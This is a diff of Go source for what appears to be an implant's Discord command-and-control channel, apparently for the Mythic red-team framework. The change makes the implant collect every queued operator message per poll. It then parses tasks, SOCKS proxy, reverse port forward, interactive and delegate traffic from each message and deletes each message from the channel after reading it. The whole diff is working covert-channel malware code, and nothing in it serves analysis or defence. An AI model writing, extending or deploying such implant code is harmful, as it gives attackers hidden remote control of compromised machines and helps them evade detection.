@@ -396,80 +396,86 @@ func (d *DiscordProfile) GetTasking(agent *structs.Agent, outboundSocks []struct
 		return nil, nil, err
 	}
 
-	responseMessage, err := d.sendAndPoll(mythicMessage, activeUUID, cfg)
+	// Use sendAndPollAll to collect ALL matching messages. In push C2, the channel
+	// may contain both the get_tasking response (empty tasks) AND pushed task messages.
+	responseMessages, err := d.sendAndPollAll(mythicMessage, activeUUID, cfg)
 	if err != nil {
 		return nil, nil, fmt.Errorf("get tasking via Discord failed: %w", err)
 	}
 
-	decryptedData, err := d.unwrapResponse(responseMessage, cfg.EncryptionKey)
-	if err != nil {
-		return nil, nil, fmt.Errorf("failed to decrypt tasking response: %w", err)
-	}
-
-	// Parse the decrypted response
-	var taskResponse map[string]interface{}
-	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
-		return []structs.Task{}, nil, nil
-	}
-
-	// Extract tasks
 	var tasks []structs.Task
-	if taskList, exists := taskResponse["tasks"]; exists {
-		if taskArray, ok := taskList.([]interface{}); ok {
-			for _, taskData := range taskArray {
-				if taskMap, ok := taskData.(map[string]interface{}); ok {
-					task := structs.NewTask(
-						getString(taskMap, "id"),
-						getString(taskMap, "command"),
-						getString(taskMap, "parameters"),
-					)
-					tasks = append(tasks, task)
-				}
-			}
-		}
-	}
-
-	// Extract SOCKS messages
 	var inboundSocks []structs.SocksMsg
-	if socksList, exists := taskResponse["socks"]; exists {
-		if socksRaw, err := json.Marshal(socksList); err == nil {
-			if err := json.Unmarshal(socksRaw, &inboundSocks); err != nil {
-				log.Printf("proxy parse error: %v", err)
-			}
-		}
-	}
 
-	// Route rpfwd messages
-	if d.HandleRpfwd != nil {
-		if rpfwdList, exists := taskResponse["rpfwd"]; exists {
-			if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
-				var rpfwdMsgs []structs.SocksMsg
-				if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
-					d.HandleRpfwd(rpfwdMsgs)
+	// Process ALL returned messages — merge tasks from each
+	for _, responseMessage := range responseMessages {
+		decryptedData, err := d.unwrapResponse(responseMessage, cfg.EncryptionKey)
+		if err != nil {
+			continue
+		}
+
+		var taskResponse map[string]interface{}
+		if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
+			continue
+		}
+
+		// Extract tasks from this message
+		if taskList, exists := taskResponse["tasks"]; exists {
+			if taskArray, ok := taskList.([]interface{}); ok {
+				for _, taskData := range taskArray {
+					if taskMap, ok := taskData.(map[string]interface{}); ok {
+						task := structs.NewTask(
+							getString(taskMap, "id"),
+							getString(taskMap, "command"),
+							getString(taskMap, "parameters"),
+						)
+						tasks = append(tasks, task)
+					}
 				}
 			}
 		}
-	}
 
-	// Route interactive messages
-	if d.HandleInteractive != nil {
-		if interactiveList, exists := taskResponse["interactive"]; exists {
-			if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
-				var interactiveMsgs []structs.InteractiveMsg
-				if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
-					d.HandleInteractive(interactiveMsgs)
+		// Extract SOCKS messages from this message
+		if socksList, exists := taskResponse["socks"]; exists {
+			if socksRaw, err := json.Marshal(socksList); err == nil {
+				var socks []structs.SocksMsg
+				if err := json.Unmarshal(socksRaw, &socks); err == nil {
+					inboundSocks = append(inboundSocks, socks...)
 				}
 			}
 		}
-	}
 
-	// Route delegate messages
-	if d.HandleDelegates != nil {
-		if delegateList, exists := taskResponse["delegates"]; exists {
-			if delegateRaw, err := json.Marshal(delegateList); err == nil {
-				var delegates []structs.DelegateMessage
-				if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
-					d.HandleDelegates(delegates)
+		// Route rpfwd messages from this message
+		if d.HandleRpfwd != nil {
+			if rpfwdList, exists := taskResponse["rpfwd"]; exists {
+				if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
+					var rpfwdMsgs []structs.SocksMsg
+					if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
+						d.HandleRpfwd(rpfwdMsgs)
+					}
+				}
+			}
+		}
+
+		// Route interactive messages from this message
+		if d.HandleInteractive != nil {
+			if interactiveList, exists := taskResponse["interactive"]; exists {
+				if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
+					var interactiveMsgs []structs.InteractiveMsg
+					if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
+						d.HandleInteractive(interactiveMsgs)
+					}
+				}
+			}
+		}
+
+		// Route delegate messages from this message
+		if d.HandleDelegates != nil {
+			if delegateList, exists := taskResponse["delegates"]; exists {
+				if delegateRaw, err := json.Marshal(delegateList); err == nil {
+					var delegates []structs.DelegateMessage
+					if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
+						d.HandleDelegates(delegates)
+					}
 				}
 			}
 		}
@@ -582,10 +588,32 @@ func (d *DiscordProfile) PostResponse(response structs.Response, agent *structs.
 
 // ─── Discord API Methods ─────────────────────────────────────────────────────
 
+// matchesAgent checks if a server→agent message is addressed to this agent.
+func (d *DiscordProfile) matchesAgent(respWrapper *MythicMessageWrapper, clientID, senderID string) bool {
+	return !respWrapper.ToServer && (respWrapper.ClientID == clientID ||
+		respWrapper.SenderID == senderID ||
+		respWrapper.ClientID == senderID ||
+		(d.PayloadUUID != "" && respWrapper.ClientID == d.PayloadUUID))
+}
+
 // sendAndPoll sends a Mythic message via Discord and polls for the server's response.
 // mythicMessage is the base64-encoded Mythic message (UUID + encrypted payload).
 // senderID is the agent's UUID used for message correlation.
 func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensitiveConfig) (string, error) {
+	results, err := d.sendAndPollAll(mythicMessage, senderID, cfg)
+	if err != nil {
+		return "", err
+	}
+	if len(results) == 0 {
+		return "", fmt.Errorf("no response after polling")
+	}
+	return results[0], nil
+}
+
+// sendAndPollAll sends a Mythic message via Discord and collects ALL matching server→agent
+// responses. In push C2 mode, multiple messages may be queued (get_tasking response + pushed
+// tasks), so this function returns all of them rather than just the first match.
+func (d *DiscordProfile) sendAndPollAll(mythicMessage, senderID string, cfg *sensitiveConfig) ([]string, error) {
 	clientID := d.nextClientID()
 
 	wrapper := MythicMessageWrapper{
@@ -597,21 +625,23 @@ func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensit
 
 	wrapperJSON, err := json.Marshal(wrapper)
 	if err != nil {
-		return "", fmt.Errorf("failed to marshal wrapper: %w", err)
+		return nil, fmt.Errorf("failed to marshal wrapper: %w", err)
 	}
 
 	// Send to Discord — use file attachment if message is too large
 	if len(wrapperJSON) > maxMessageLength {
 		if err := d.sendFileMessage(wrapperJSON, senderID+"server", cfg); err != nil {
-			return "", fmt.Errorf("file upload failed: %w", err)
+			return nil, fmt.Errorf("file upload failed: %w", err)
 		}
 	} else {
 		if err := d.sendTextMessage(string(wrapperJSON), cfg); err != nil {
-			return "", fmt.Errorf("text message failed: %w", err)
+			return nil, fmt.Errorf("text message failed: %w", err)
 		}
 	}
 
-	// Poll for response matching our sender_id with to_server=false
+	// Poll for responses matching our sender_id with to_server=false.
+	// Collect ALL matching messages — in push C2, both the get_tasking response
+	// and pushed task messages may be present simultaneously.
 	for attempt := 0; attempt < d.MaxRetries; attempt++ {
 		time.Sleep(time.Duration(d.PollInterval) * time.Second)
 
@@ -621,26 +651,25 @@ func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensit
 			continue
 		}
 
+		var matched []string
 		for _, msg := range messages {
 			respWrapper, err := d.parseDiscordMessage(msg, cfg)
 			if err != nil {
 				continue
 			}
 
-			// Match: to_server=false and one of:
-			// - client_id matches our tracking ID (clientID)
-			// - sender_id matches us (senderID)
-			// - client_id matches our sender_id (server echoes sender_id as client_id)
-			// - client_id matches payload UUID (Mythic push C2 uses payload UUID as TrackingID for pushed tasks)
-			if !respWrapper.ToServer && (respWrapper.ClientID == clientID || respWrapper.SenderID == senderID || respWrapper.ClientID == senderID || (d.PayloadUUID != "" && respWrapper.ClientID == d.PayloadUUID)) {
-				// Delete the response message from the channel after reading
+			if d.matchesAgent(respWrapper, clientID, senderID) {
 				d.deleteMessage(msg.ID, cfg)
-				return respWrapper.Message, nil
+				matched = append(matched, respWrapper.Message)
 			}
+		}
+
+		if len(matched) > 0 {
+			return matched, nil
 		}
 	}
 
-	return "", fmt.Errorf("no response after %d polling attempts", d.MaxRetries)
+	return nil, fmt.Errorf("no response after %d polling attempts", d.MaxRetries)
 }
 
 // parseDiscordMessage extracts a MythicMessageWrapper from a Discord message.
